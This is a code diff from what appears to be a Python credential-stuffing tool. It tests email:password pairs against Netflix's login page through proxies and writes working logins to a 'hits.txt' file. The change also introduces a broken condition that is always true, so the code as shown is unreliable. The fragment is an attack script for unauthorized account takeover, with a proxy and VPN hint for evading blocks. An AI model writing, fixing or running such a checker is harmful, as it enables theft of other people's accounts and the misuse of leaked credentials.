@@ -118,9 +118,9 @@ def check_account(email,password):
             "countryIsoCode": "US"
         }  
         
-        request = client.post("https://www.netflix.com/login",headers=headers,data=data,proxies=proxy)
+        req = client.post("https://www.netflix.com/login",headers=headers,data=data,proxies=proxy)
     
-        if 'Incorrect password' in request.text:
+        if 'Sorry, we can\'t find an account with this email address. Please try again or' or 'Incorrect password' in req.text:
             lock.acquire()
             print(Fore.RED+'[BAD] '+email+':'+password+Fore.RESET)
             invalid+=1
@@ -130,7 +130,8 @@ def check_account(email,password):
             print(Fore.GREEN+'[GOOD] '+email+':'+password+Fore.RESET)
             valid+=1
             file = open("hits.txt","a").write(email+":"+password+"\n")   
-            lock.release()           
+            lock.release()
+            
     except:
         print(Fore.RED+'[ERROR] Proxy timeout. Change your proxies or use a different VPN'+Fore.RESET)
    
